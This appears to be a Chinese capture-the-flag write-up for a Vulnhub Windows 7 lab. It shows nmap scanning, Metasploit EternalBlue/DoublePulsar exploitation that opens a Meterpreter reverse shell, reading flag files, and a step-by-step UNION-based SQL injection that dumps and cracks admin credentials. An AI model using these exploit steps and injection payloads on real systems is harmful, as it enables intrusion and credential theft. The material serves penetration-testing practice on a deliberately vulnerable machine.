---
title: Vulnhub-win7-attack
published: 2025-03-09 16:17:52
tags: [Vulnhub]
category: 靶机
draft: false
---

# win7-attack

> by gongli
> 

## 端口扫描主机发现

1. 探测存活主机，`161`是靶机
    
    ```php
    nmap -sP 192.168.75.0/24
    //
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-20 10:59 CST
    Nmap scan report for 192.168.75.1
    Host is up (0.00027s latency).
    MAC Address: 00:50:56:C0:00:08 (VMware)
    Nmap scan report for 192.168.75.2
    Host is up (0.00021s latency).
    MAC Address: 00:50:56:FB:CA:45 (VMware)
    Nmap scan report for 192.168.75.162
    Host is up (0.00026s latency).
    MAC Address: 00:0C:29:BD:3E:47 (VMware)
    Nmap scan report for 192.168.75.254
    Host is up (0.00025s latency).
    MAC Address: 00:50:56:E1:D9:7D (VMware)
    Nmap scan report for 192.168.75.151
    ```
    
2. 探测主机所有开放端口
    
    ```php
    nmap -sT -min-rate 10000 -p- 192.168.75.162
    //
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-20 11:01 CST
    Warning: 192.168.75.162 giving up on port because retransmission cap hit (10).
    Nmap scan report for 192.168.75.162
    Host is up (0.00072s latency).
    Not shown: 64615 closed tcp ports (conn-refused), 907 filtered tcp ports (no-response)
    PORT      STATE SERVICE
    80/tcp    open  http
    135/tcp   open  msrpc
    139/tcp   open  netbios-ssn
    445/tcp   open  microsoft-ds
    3306/tcp  open  mysql
    3389/tcp  open  ms-wbt-server
    5357/tcp  open  wsdapi
    49152/tcp open  unknown
    49153/tcp open  unknown
    49154/tcp open  unknown
    49155/tcp open  unknown
    49156/tcp open  unknown
    49157/tcp open  unknown
    MAC Address: 00:0C:29:BD:3E:47 (VMware)
    ```
    
3. 探测服务版本以及系统版本
    
    ```php
    nmap -sV -sT -O -p80,3306,135,139,445,3389,5357 192.168.75.162
    //
    PORT     STATE SERVICE        VERSION
    80/tcp   open  http           Microsoft IIS httpd 7.5
    135/tcp  open  msrpc          Microsoft Windows RPC
    139/tcp  open  netbios-ssn    Microsoft Windows netbios-ssn
    445/tcp  open  microsoft-ds   Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
    3306/tcp open  mysql          MySQL 5.5.11
    3389/tcp open  ms-wbt-server?
    5357/tcp open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port3389-TCP:V=7.94SVN%I=7%D=10/20%Time=67147317%P=x86_64-pc-linux-gnu%
    SF:r(TerminalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\x01\x08\
    SF:0\x02\0\0\0");
    MAC Address: 00:0C:29:BD:3E:47 (VMware)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running: Microsoft Windows 7|2008|8.1
    OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1
    OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1
    ```
    
4. 扫描漏洞
    
    ```c
    nmap -script=vuln -p80,3306,135,139,445,3389,5357 192.168.75.162
    //
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-20 11:05 CST
    Nmap scan report for 192.168.75.162
    Host is up (0.00040s latency).
    
    PORT     STATE SERVICE
    80/tcp   open  http
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    | http-enum: 
    |   /robots.txt: Robots file
    |_  /data/: Potentially interesting folder
    135/tcp  open  msrpc
    139/tcp  open  netbios-ssn
    445/tcp  open  microsoft-ds
    3306/tcp open  mysql
    |_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)
    3389/tcp open  ms-wbt-server
    |_ssl-ccs-injection: No reply from server (TIMEOUT)
    5357/tcp open  wsdapi
    MAC Address: 00:0C:29:BD:3E:47 (VMware)
    
    Host script results:
    |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
    |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
    |_smb-vuln-ms10-054: false
    | smb-vuln-ms17-010: 
    |   VULNERABLE:
    |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
    |     State: VULNERABLE
    |     IDs:  CVE:CVE-2017-0143
    |     Risk factor: HIGH
    |       A critical remote code execution vulnerability exists in Microsoft SMBv1
    |        servers (ms17-010).
    |           
    |     Disclosure date: 2017-03-14
    |     References:
    |       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
    |_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
    
    ```
    
5. 一波操作，web服务器是`IIS 7.5` ，mysql版本是`5.5.11` ,以及135 `RPC`，138 `NetBIOS`，445 `SMB` 
    
    扫描漏洞，80端口下存在两个较可疑文件夹；3306疑似发现`cve2012-2122`；还扫描到了SMB服务器的漏洞`CVE-2017-0143` 等级为`high`
    
    优先级：`CVE-2017-0143` > 80 >…
    

## CVE-2017-0143

1. 永恒之蓝 MS17-010
2. 检测是否存在
    - 使用msf进行扫描是否存在
        
        ```c
        msf6 > search MS17-010
        
        Matching Modules
        ================
        
           #   Name                                           Disclosure Date  Rank     Check  Description
           -   ----                                           ---------------  ----     -----  -----------
           0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
           1     \_ target: Automatic Target                  .                .        .      .
           2     \_ target: Windows 7                         .                .        .      .
           3     \_ target: Windows Embedded Standard 7       .                .        .      .
           4     \_ target: Windows Server 2008 R2            .                .        .      .
           5     \_ target: Windows 8                         .                .        .      .
           6     \_ target: Windows 8.1                       .                .        .      .
           7     \_ target: Windows Server 2012               .                .        .      .
           8     \_ target: Windows 10 Pro                    .                .        .      .
           9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
           10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
           11    \_ target: Automatic                         .                .        .      .
           12    \_ target: PowerShell                        .                .        .      .
           13    \_ target: Native upload                     .                .        .      .
           14    \_ target: MOF upload                        .                .        .      .
           15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
           16    \_ AKA: ETERNALROMANCE                       .                .        .      .
           17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
           18    \_ AKA: ETERNALBLUE                          .                .        .      .
           19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
           20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
           21    \_ AKA: ETERNALROMANCE                       .                .        .      .
           22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
           23    \_ AKA: ETERNALBLUE                          .                .        .      .
           24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
           25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
           26    \_ AKA: ETERNALBLUE                          .                .        .      .
           27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
           28    \_ target: Execute payload (x64)             .                .        .      .
           29    \_ target: Neutralize implant                .                .        .      .
        ```
        
    - 使用 `auxiliary/scanner/smb/smb_ms17_010` 检查漏洞是否存在
        
        ```c
        msf6 > use auxiliary/scanner/smb/smb_ms17_010 
        msf6 auxiliary(scanner/smb/smb_ms17_010) > set rhosts 192.168.75.162
        msf6 auxiliary(scanner/smb/smb_ms17_010) > ru
        [+] 192.168.75.162:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x86 (32-bit)
        [*] 192.168.75.162:445    - Scanned 1 of 1 hosts (100% complete)
        [*] Auxiliary module execution completed
        ```
        
        可能易受攻击，存在漏洞
        
3. 渗透执行
    - 使用永恒之蓝漏洞 `ms17_010_eternalblue`
        
        ```c
        msf6 > use exploit/windows/smb/ms17_010_eternalblue 
        msf6 exploit(windows/smb/ms17_010_eternalblue) > options
        msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 192.168.75.162
        msf6 exploit(windows/smb/ms17_010_eternalblue) > run                                                                                                         
                                                                                                                                                                     
        [*] Started reverse TCP handler on 192.168.75.151:4444                                                                                                       
        [*] 192.168.75.162:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check                                                                                   
        [+] 192.168.75.162:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x86 (32-bit)                                     
        [*] 192.168.75.162:445    - Scanned 1 of 1 hosts (100% complete)                                                                                             
        [+] 192.168.75.162:445 - The target is vulnerable.                                                                                                           
        [-] 192.168.75.162:445 - Exploit aborted due to failure: no-target: This module only supports x64 (64-bit) targets                                           
        [*] Exploit completed, but no session was created.
        ```
        
        提示 `Exploit aborted due to failure: no-target: This module only supports x64 (64-bit) targets`
        
        仅支持x64的模块，需要安装x32的模块
        
4. 安装`x86`的模块
    - 模块
        
        [https://github.com/1stPeak/Eternalblue-Doublepulsar-Metasploit-master](https://github.com/1stPeak/Eternalblue-Doublepulsar-Metasploit-master)
        
        kali没有32位的利用模块将下载下来的`Eternalblue-Doublepulsar-Metasploit-master`的名字改为`Eternalblue-Doublepulsar-Metasploit`并将改完名后的整个目录复制到root目录下(需要解压2次,把最后一次解压名改为Eternalblue-Doublepulsar-Metasploit 并放到/root目录下)`eternalblue_doublepulsar.rb` 拷贝到`/usr/share/metasploitframework/modules/exploits/windows/smb`目录下
        
    - 安装框架
        
        ```c
        dpkg --add-architecture i386 && apt-get update && apt-get install wine32
        ```
        
5. 执行模块
    
    获得shell
    
    ```c
    msf6 > use exploit/windows/smb/eternalblue_doublepulsar 
    msf6 exploit(windows/smb/eternalblue_doublepulsar) > options
    msf6 exploit(windows/smb/eternalblue_doublepulsar) > set rhosts 192.168.75.162
    msf6 exploit(windows/smb/eternalblue_doublepulsar) > set processinject explorer.exe
    msf6 exploit(windows/smb/eternalblue_doublepulsar) > exploit
    // 能成功但是反弹不了shell ， 修改processinject为lsass.exe
    msf6 exploit(windows/smb/eternalblue_doublepulsar) > set processinject lsass.exe
    msf6 exploit(windows/smb/eternalblue_doublepulsar) > run
    
    [*] Started reverse TCP handler on 192.168.75.151:4444 
    [*] 192.168.75.162:445 - Generating Eternalblue XML data
    [*] 192.168.75.162:445 - Generating Doublepulsar XML data
    [*] 192.168.75.162:445 - Generating payload DLL for Doublepulsar
    [*] 192.168.75.162:445 - Writing DLL in /root/.wine/drive_c/eternal11.dll
    [*] 192.168.75.162:445 - Launching Eternalblue...
    [+] 192.168.75.162:445 - Backdoor is already installed
    [*] 192.168.75.162:445 - Launching Doublepulsar...
    [*] Sending stage (176198 bytes) to 192.168.75.162
    [*] Meterpreter session 1 opened (192.168.75.151:4444 -> 192.168.75.162:49233) at 2024-10-20 14:41:13 +0800
    [+] 192.168.75.162:445 - Remote code executed... 3... 2... 1...
    meterpreter > 
    ```
    

## flag2

`c`盘根目录下存在`flag2.txt`

```c
C:\Windows\system32>ipconfig
ipconfig

Windows IP ����

���������� ��������:

   �����ض��� DNS ��׺ . . . . . . . : localdomain
   �������� IPv6 ��. . . . . . . . : fe80::ed56:10a0:d8a7:f304%11
   IPv4 �� . . . . . . . . . . . . : 192.168.75.162
   ��������  . . . . . . . . . . . . : 255.255.255.0
   Ĭ������. . . . . . . . . . . . . : 192.168.75.2

���������� isatap.localdomain:

   ý��״  . . . . . . . . . . . . : ý���ѶϿ�
   �����ض��� DNS ��׺ . . . . . . . : localdomain

���������� ��������*:

   ý��״  . . . . . . . . . . . . : ý���ѶϿ�
   �����ض��� DNS ��׺ . . . . . . . : 
//
C:\Windows\system32>Cd c:/
Cd c:/
//
c:\>dir
dir
 ������ C �еľ�û�б�ǩ��
 �������к��� D648-E0A4

 c:\ ��Ŀ¼

2017/12/11  07:38    <DIR>          Admin
2009/06/11  05:42                24 autoexec.bat
2009/06/11  05:42                10 config.sys
2020/09/13  08:46               149 flag2.txt
2017/12/11  07:38    <DIR>          Home
2017/12/11  06:46    <DIR>          inetpub
2009/07/14  10:37    <DIR>          PerfLogs
2017/12/12  00:40    <DIR>          Program Files
2017/11/07  15:18    <DIR>          Python27
2020/09/05  16:01    <DIR>          Users
2024/10/20  16:06    <DIR>          Windows
               3 ���ļ�            183 ��
               8 ��Ŀ¼ 54,033,711,104 ������
//
c:\>type flag2.txt
type flag2.txt
��ϲ��!���ǵ�2��flag,��ȥ��ʣ�µ�flag��.
flag{ajkwncalwrli}

�ɴ��۾��Ϳ����ҵ�������.
��3��flag����Administrator�û���������
```

## flag3

在靶机桌面

```c
C:\Users\Administrator\Desktop>type flag3.txt
//
type flag3.txt
flag{cjdhrncalzos}

��ϲ�ɹ���!
```

`flag{ajkwncalwrli}` 继续寻找`flag1` ，可能在web

## web渗透-1

1. 前面nmap扫描出，存在有兴趣的目录
    
    ```c
    | http-enum: 
    |   /robots.txt: Robots file
    |_  /data/: Potentially interesting folder
    ```
    
    没什么有价值的东西
    
2. 经测试`/index.php?s=/news/1` 存在注入
    
    ```c
    index.php?s=/news/1) order by 1%23 // 闭合成功
    index.php?s=/news/1) order by 7%23 // 7个字段
    index.php?s=/news/0) union select 1,2,3,4,5,6,7 %23 **// 2 和 7 为显示位**
    index.php?s=/news/0) union select 1,database(),3,4,5,6,7 %23  // 当前数据库为 tpx
    index.php?s=/news/0) union select 1,user(),3,4,5,6,7 %23   // 当前用户 root
    ```
    
    ```c
    index.php?s=/news/0) union select 1,group_concat(table_name),3,4,5,6,7 from information_schema.tables where table_schema = database() %23
    // 得到表
    //  tpx_admin_access,tpx_admin_node,tpx_admin_role,tpx_admin_role_user,tpx_admin_user,tpx_cms_news,tpx_cms_partner,tpx_cms_product,tpx_cms_product_cat,tpx_cms_single_page,tpx_cms_slide,tpx_cms_tag_pool,tpx_config,tpx_data_files 
    // tpx_admin_user 是我们感兴趣的
    
    index.php?s=/news/0) union select 1,group_concat(column_name),3,4,5,6,7 from information_schema.columns where table_schema = database() and table_name='tpx_admin_user' %23
    // 得到表 tpx_admin_user 的列
    //  id,username,password,password_salt,reg_time,reg_ip,last_login_time,last_login_ip,last_change_pwd_time,status 
    
    index.php?s=/news/0) union select 1,group_concat(' username=',username,' password=',password,' salt=',password_salt),3,4,5,6,7 from tpx_admin_user %23
    // 获得数据 username ，password的数据
    //   ,username=admin ,password=VFZSSmVrNUVWVEpaYlhneFdsRTlQUT09,salt=XGFnMdiWxf, ,username=admin2 ,password=e10adc3949ba59abbe56e057f20f883e,salt=IQKwyDoYFc, ,username=admin3 ,password=TVRJek5EVTJabmxRWldoS2NFZHhkZz09,salt=fyPehJpGqv, ,username=flag ,password=XTDXANDLDXY,salt=666666 
    ```
    
3. 破解密码
    
    ```c
    admin = 123456blue
    admin2 = 123456
    admin3 = 123456fyPehJpGqv
    ```
    

## flag

sql注入获得flag `XTDXANDLDXY`

## web渗透-2

1. 扫描登陆页面 ，`admin.php`
    
    ```c
    admin = 123456blue
    admin2 = 123456
    admin3 = 123456fyPehJpGqv
    ```
    
    均登陆失败
    
2. 得知密码是`VFZSSmVrNUVWVEpaYlhneFdsRTlQUT09`解码两次的结果`MTIzNDU2Ymx1ZQ==` ….
    
    登陆成功